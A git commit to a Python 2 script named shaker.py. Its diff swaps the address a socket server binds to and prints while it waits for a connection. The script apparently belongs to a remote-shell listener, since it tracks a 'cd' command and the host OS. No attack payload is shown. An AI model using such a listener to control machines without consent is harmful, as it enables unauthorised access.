85220c75d94d71ce6e50f58faea0a814212710fa
j0lt <34833539+j0lt-github@users.noreply.github.com>
2019-04-10 11:54:05 +0530

    Update shaker.py

--- shaker.py
+++ shaker.py
@@ -16,7 +16,7 @@ from platform import system
 class server:
 
     def __init__(self,port):
-        self.ip = socket.gethostbyname(socket.gethostname())
+        self.ip = socket.gethostbyname('0.0.0.0')
         self.port = port
         self.l = "cd"
         self.o = system()
@@ -33,7 +33,7 @@ class server:
             _exit(1)
         try:
             so.listen(1)
-            host = socket.gethostbyname(0.0.0.0)
+            host = socket.gethostbyname(socket.gethostname())
             print "[%s:%s] Waiting for connection ..."%(host,self.port)
 
 
